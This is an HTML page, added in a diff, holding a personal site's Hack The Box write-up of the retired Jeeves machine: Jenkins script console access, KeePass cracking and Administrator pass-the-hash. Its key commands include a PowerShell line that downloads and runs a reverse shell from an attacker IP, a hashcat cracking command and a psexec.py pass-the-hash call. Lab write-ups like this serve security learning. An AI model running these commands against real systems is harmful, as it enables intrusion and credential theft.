@@ -1,0 +1,88 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>HTB Jeeves | Daniel Galindo</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Space+Grotesk:wght@400;500;700&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="/src/styles/styles.css" />
+  </head>
+  <body data-page="writeups">
+    <div class="grid-overlay" aria-hidden="true"></div>
+    <div class="noise-overlay" aria-hidden="true"></div>
+
+    <header class="site-header">
+      <a class="site-logo" href="/en/index.html">met4ll0f</a>
+      <nav class="site-nav" aria-label="Main navigation">
+        <a data-nav="home" href="/en/index.html">Home</a>
+        <a data-nav="writeups" href="/en/writeups.html">Writeups</a>
+        <a data-nav="scripts" href="/en/scripts.html">Scripts</a>
+      </nav>
+    </header>
+
+    <section class="hero hero-compact">
+      <p class="hero-kicker">Hack The Box - Jenkins Exploitation</p>
+      <h1>HTB Jeeves</h1>
+      <p class="headline">Unauthenticated Jenkins script console, KeePass cracking and Administrator pass-the-hash</p>
+      <p class="meta">Retired - Root / Administrator</p>
+    </section>
+
+    <main class="writeup-article">
+      <section class="panel panel-large">
+<h2>Executive Summary</h2>
+<p>Jeeves exposes a Jenkins instance on a high TCP port. The script console allows Groovy command execution, which is used to download and execute a PowerShell reverse shell.</p>
+<h2>Initial Access</h2>
+<p>After directory discovery finds Jenkins, a new build item and the script console confirm command execution. A Nishang PowerShell payload gives a shell as <code>kohsuke</code>.</p>
+<h2>Credential Recovery</h2>
+<p>Local enumeration reveals a KeePass database. The database is copied out over SMB, converted with <code>keepass2john</code>, and cracked with a wordlist to recover the master password.</p>
+<h2>Privilege Escalation</h2>
+<p>The KeePass vault contains the Administrator NTLM hash. Pass-the-hash with <code>psexec.py</code> gives an Administrator shell. The final flag is hidden in an NTFS Alternate Data Stream and recovered with <code>more &lt; hm.txt:root.txt</code>.</p>
+<h2>Key Commands</h2>
+<pre><code class="language-bash">cmd = &quot;&quot;&quot; powershell &quot;IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.16.6/rev.ps1&#39;)&quot; &quot;&quot;&quot;</code></pre>
+<pre><code class="language-bash">keepass2john CEH.kdbx</code></pre>
+<pre><code class="language-bash">hashcat -m 13400 &lt;hash-file&gt; /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt</code></pre>
+<pre><code class="language-bash">psexec.py jeeves/Administrator@10.129.14.69 -hashes aad3b435b51404eeaad3b435b51404ee:&lt;redacted-ntlm&gt;</code></pre>
+<pre><code class="language-bash">dir /r</code></pre>
+<pre><code class="language-bash">more &lt; hm.txt:root.txt</code></pre>
+<h2>Evidence Trail</h2>
+<p>The following screenshots preserve the original lab evidence sequence from the Obsidian notes.</p>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jeeves/Pasted%20image%2020251031164449.png" alt="jeeves evidence 01" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jeeves/Pasted%20image%2020251031165851.png" alt="jeeves evidence 02" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jeeves/Pasted%20image%2020251031170003.png" alt="jeeves evidence 03" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jeeves/Pasted%20image%2020251031170259.png" alt="jeeves evidence 04" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jeeves/Pasted%20image%2020251031170929.png" alt="jeeves evidence 05" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jeeves/Pasted%20image%2020251031171120.png" alt="jeeves evidence 06" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jeeves/Pasted%20image%2020251031172409.png" alt="jeeves evidence 07" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jeeves/Pasted%20image%2020251031173619.png" alt="jeeves evidence 08" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jeeves/Pasted%20image%2020251031173640.png" alt="jeeves evidence 09" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jeeves/Pasted%20image%2020251031174151.png" alt="jeeves evidence 10" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jeeves/Pasted%20image%2020251031180102.png" alt="jeeves evidence 11" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jeeves/Pasted%20image%2020251031180359.png" alt="jeeves evidence 12" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jeeves/Pasted%20image%2020251031184514.png" alt="jeeves evidence 13" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jeeves/Pasted%20image%2020251031184806.png" alt="jeeves evidence 14" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jeeves/Pasted%20image%2020251031190702.png" alt="jeeves evidence 15" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jeeves/Pasted%20image%2020251031190759.png" alt="jeeves evidence 16" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jeeves/Pasted%20image%2020251031191430.png" alt="jeeves evidence 17" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jeeves/Pasted%20image%2020251108172650.png" alt="jeeves evidence 18" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jeeves/Pasted%20image%2020251108172811.png" alt="jeeves evidence 19" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jeeves/Pasted%20image%2020251108172918.png" alt="jeeves evidence 20" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jeeves/Pasted%20image%2020251108173157.png" alt="jeeves evidence 21" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jeeves/Pasted%20image%2020251108173556.png" alt="jeeves evidence 22" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jeeves/Pasted%20image%2020251108174032.png" alt="jeeves evidence 23" /></figure>
+      </section>
+    </main>
+
+    <footer class="footer">
+      <p>© <span class="js-year"></span> <span class="js-name"></span>.</p>
+      <a href="/en/writeups.html">Back to writeups</a>
+    </footer>
+
+    <script type="module" src="/src/js/site.js"></script>
+    <script type="module" src="/src/js/writeup-media.js"></script>
+  </body>
+</html>
